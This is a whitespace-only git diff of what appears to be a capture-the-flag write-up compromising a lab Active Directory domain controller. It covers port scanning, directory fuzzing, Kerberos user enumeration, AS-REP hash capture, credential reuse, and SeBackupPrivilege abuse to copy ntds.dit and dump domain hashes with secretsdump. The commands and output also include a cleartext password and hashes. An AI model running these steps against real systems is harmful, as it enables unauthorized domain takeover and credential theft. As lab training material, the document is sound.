@@ -1,30 +1,30 @@
 ﻿# PORT SCAN
 ---
 
-| PORT     | SERVICE         |
+| PORT | SERVICE |
 |----------|-----------------|
-| 53/tcp   | domain          |
-| 80/tcp   | http            |
-| 88/tcp   | kerberos-sec    |
-| 135/tcp  | msrpc           |
-| 139/tcp  | netbios-ssn     |
-| 389/tcp  | ldap            |
-| 445/tcp  | microsoft-ds    |
-| 464/tcp  | kpasswd5        |
-| 593/tcp  | ncacn_http      |
-| 636/tcp  | tcpwrapped      |
-| 3268/tcp | ldap            |
-| 3269/tcp | tcpwrapped      |
-| 3389/tcp | ms-wbt-server   |
-| 5985/tcp | http            |
-| 9389/tcp | mc-nmf          |
-| 49666/tcp| msrpc           |
-| 49668/tcp| msrpc           |
-| 49669/tcp| ncacn_http      |
-| 49670/tcp| msrpc           |
-| 49677/tcp| msrpc           |
-| 49690/tcp| msrpc           |
-| 49707/tcp| msrpc           |
+| 53/tcp | domain |
+| 80/tcp | http |
+| 88/tcp | kerberos-sec |
+| 135/tcp | msrpc |
+| 139/tcp | netbios-ssn |
+| 389/tcp | ldap |
+| 445/tcp | microsoft-ds |
+| 464/tcp | kpasswd5 |
+| 593/tcp | ncacn_http |
+| 636/tcp | tcpwrapped |
+| 3268/tcp | ldap |
+| 3269/tcp | tcpwrapped |
+| 3389/tcp | ms-wbt-server |
+| 5985/tcp | http |
+| 9389/tcp | mc-nmf |
+| 49666/tcp| msrpc |
+| 49668/tcp| msrpc |
+| 49669/tcp| ncacn_http |
+| 49670/tcp| msrpc |
+| 49677/tcp| msrpc |
+| 49690/tcp| msrpc |
+| 49707/tcp| msrpc |
 
 
 
@@ -44,8 +44,8 @@ smbclient -L //10.10.231.61 -N
 Can't load /etc/samba/smb.conf - run testparm to debug it
 Anonymous login successful
 
-	Sharename       Type      Comment
-	---------       ----      -------
+	Sharename Type Comment
+	--------- ---- -------
 SMB1 disabled -- no workgroup available
 ```
 
@@ -103,43 +103,43 @@ We got some stuff on here, let's try to fuzz to find more hidden directories:
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.231.61/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.231.61/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .php .html .txt .git .js
+ :: Method : GET
+ :: URL : http://10.10.231.61/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions : .php .html .txt .git .js
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-index.html              [Status: 200, Size: 53888, Words: 18198, Lines: 1364, Duration: 236ms]
-img                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 557ms]
-blog.html               [Status: 200, Size: 22163, Words: 7549, Lines: 575, Duration: 390ms]
-css                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 236ms]
-Index.html              [Status: 200, Size: 53888, Words: 18198, Lines: 1364, Duration: 248ms]
-lib                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 244ms]
-js                      [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 227ms]
-Blog.html               [Status: 200, Size: 22163, Words: 7549, Lines: 575, Duration: 317ms]
-backup                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 325ms]
-Backup                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 239ms]
-IMG                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 239ms]
-INDEX.html              [Status: 200, Size: 53888, Words: 18198, Lines: 1364, Duration: 233ms]
-contactform             [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 267ms]
-CSS                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 230ms]
-Img                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 240ms]
-JS                      [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 239ms]
+index.html [Status: 200, Size: 53888, Words: 18198, Lines: 1364, Duration: 236ms]
+img [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 557ms]
+blog.html [Status: 200, Size: 22163, Words: 7549, Lines: 575, Duration: 390ms]
+css [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 236ms]
+Index.html [Status: 200, Size: 53888, Words: 18198, Lines: 1364, Duration: 248ms]
+lib [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 244ms]
+js [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 227ms]
+Blog.html [Status: 200, Size: 22163, Words: 7549, Lines: 575, Duration: 317ms]
+backup [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 325ms]
+Backup [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 239ms]
+IMG [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 239ms]
+INDEX.html [Status: 200, Size: 53888, Words: 18198, Lines: 1364, Duration: 233ms]
+contactform [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 267ms]
+CSS [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 230ms]
+Img [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 240ms]
+JS [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 239ms]
 ```
 
 `/backup` seems interesting, let's check it out:
@@ -179,21 +179,21 @@ We can save the users and use the tool:
 ```bash
 kerbrute userenum --dc 10.10.21.37 -d fusion.corp users.txt
 
-    __             __               __
-   / /_____  _____/ /_  _______  __/ /____
-  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
- / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+ __ __ __
+ / /_____ _____/ /_ _______ __/ /____
+ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< / __/ / / /_/ / / / /_/ / /_/ __/
+/_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/
 
 Version: dev (n/a) - 06/15/25 - Ronnie Flathers @ropnop
 
-2025/06/15 18:59:03 >  Using KDC(s):
-2025/06/15 18:59:03 >  	10.10.231.61:88
+2025/06/15 18:59:03 > Using KDC(s):
+2025/06/15 18:59:03 > 	10.10.231.61:88
 
-2025/06/15 18:59:03 >  [+] lparker has no pre auth required. Dumping hash to crack offline:
+2025/06/15 18:59:03 > [+] lparker has no pre auth required. Dumping hash to crack offline:
 $krb5asrep$18$lparker@FUSION.CORP:e14f0a12dc0b1c6b53280c85458da7fb$d5eab59340d7cdd2a0992dc5ff19000fd958b98e17286e58cc194a5f6d677c478cca9fb6099ff1ad952e5188786f06b03fcd4e5b65128a479a02b6d5ce21731bbdf2b9fb6c406c967b3a0cae1a03b2e5a456a3a90c44ff2b7870afb6e4e4eaa009f7e1e58aced3e495f47bd96b4e09c3048d7e1cee9d9169976b89e3a8f57ec970797c3cc2b84c7facad98942e8c295fb9f82336d0094011ebb0161e1697318d1a6faa49df2a39c2db0208d0b71cec30d1efcdcc90b15091a6f001ad74085a2b3f19be263f022936940c51ac1732679deab7623fa6e6edf00c234ccc4e50033961d7a12fd52f961d5001b82c96d8858840fd71d9cea2eb1886dbdb7ce35c
-2025/06/15 18:59:03 >  [+] VALID USERNAME:	 lparker@fusion.corp
-2025/06/15 18:59:03 >  Done! Tested 11 usernames (1 valid) in 0.401 seconds
+2025/06/15 18:59:03 > [+] VALID USERNAME:	 lparker@fusion.corp
+2025/06/15 18:59:03 > Done! Tested 11 usernames (1 valid) in 0.401 seconds
 ```
 
 As we can see `lparker` doesn't have `dont_require_preauth` flag disabled, this makes the user vulnerable to `AS-REP Roasting`, for some reason, when I tried cracking the hash that kerbrute gave me, it didn't work, so, we can request the right hash using `GetNPUsers.py`:
@@ -263,8 +263,8 @@ We can try these credentials on `crackmapexec` to check if we can go into `evil-
 crackmapexec winrm 10.10.21.37 -u jmurphy -p 'u8WC3!kLsgw=#bRY'
 CrackMapExec is deprecated and has been replaced by NetExec.
 This binary is just an alias for netexec command.
-WINRM       10.10.21.37     5985   FUSION-DC        [*] Windows 10 / Server 2019 Build 17763 (name:FUSION-DC) (domain:fusion.corp)
-WINRM       10.10.21.37     5985   FUSION-DC        [+] fusion.corp\jmurphy:u8WC3!kLsgw=#bRY (Pwn3d!)
+WINRM 10.10.21.37 5985 FUSION-DC [*] Windows 10 / Server 2019 Build 17763 (name:FUSION-DC) (domain:fusion.corp)
+WINRM 10.10.21.37 5985 FUSION-DC [+] fusion.corp\jmurphy:u8WC3!kLsgw=#bRY (Pwn3d!)
 ```
 
 They work, let's start privilege escalation.
@@ -319,14 +319,14 @@ expose %someAlias% z:
 Now, before we perform the attack, we need two DLLs from github, the custom DLLs (`SeBackupPrivilegeUtils.dll` and `SeBackupPrivilegeCmdLets.dll`) enable Backup Operators to weaponize their `SeBackupPrivilege` right. They provide PowerShell commands that bypass file permissions by leveraging low-level Windows backup APIs, allowing direct reading of protected files like `NTDS.dit`, which is normally locked and accessible only to SYSTEM/Administrators. This transforms the privilege into a practical file-access bypass tool without requiring admin rights.
 
 ```bash
-wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll  
-wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll  
+wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll 
+wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll 
 ```
 
 Once we got them all, let's start, first, upload the files into a temporary directory we'll create:
 
 ```
-mkdir C:\tmp  
+mkdir C:\tmp 
 cd C:\tmp
 upload SeBackupPrivilegeUtils.dll
 upload SeBackupPrivilegeCmdLets.dll
@@ -338,7 +338,7 @@ upload diskshadow.txt
 Next step is to create the shadow copy:
 
 ```
-diskshadow.exe /s .\diskshadow.txt  
+diskshadow.exe /s .\diskshadow.txt 
 ```
 
 ![Pasted image 20250615155639.png](../../IMAGES/Pasted%20image%2020250615155639.png)
@@ -346,15 +346,15 @@ diskshadow.exe /s .\diskshadow.txt
 Now, we need to use the DLLs to bypass the ACLs and copy `ntds.dit`:
 
 ```powershell
-Import-Module .\SeBackupPrivilegeUtils.dll  
-Import-Module .\SeBackupPrivilegeCmdLets.dll  
-Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit C:\tmp\ntds.dit -Overwrite  
+Import-Module .\SeBackupPrivilegeUtils.dll 
+Import-Module .\SeBackupPrivilegeCmdLets.dll 
+Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit C:\tmp\ntds.dit -Overwrite 
 ```
 
 Nice, now we need to extract the SYSTEM hive:
 
 ```
-reg save HKLM\SYSTEM C:\tmp\system  
+reg save HKLM\SYSTEM C:\tmp\system 
 ```
 
 ![Pasted image 20250615155755.png](../../IMAGES/Pasted%20image%2020250615155755.png)
@@ -362,8 +362,8 @@ reg save HKLM\SYSTEM C:\tmp\system
 Let's download both files into our machine:
 
 ```powershell
-download ntds.dit  
-download system  
+download ntds.dit 
+download system 
 ```
 
 This step will take a while so once it finished, we can use secretsdump to get the hashes:
@@ -398,7 +398,7 @@ fusion.corp\lparker:aes128-cts-hmac-sha1-96:4e918d7516a7fb9d17824f21a662a9dd
 fusion.corp\lparker:des-cbc-md5:7c154cb3bf46d904
 fusion.corp\jmurphy:aes256-cts-hmac-sha1-96:7f08daa9702156b2ad2438c272f73457f1dadfcb3837ab6a92d90b409d6f3150
 fusion.corp\jmurphy:aes128-cts-hmac-sha1-96:c757288dab94bf7d0d26e88b7a16b3f0
-fusion.corp\jmurphy:des-cbc-md5:5e64c22554988937  
+fusion.corp\jmurphy:des-cbc-md5:5e64c22554988937 
 ```
 
 We got our hash, let's use evil-winrm:
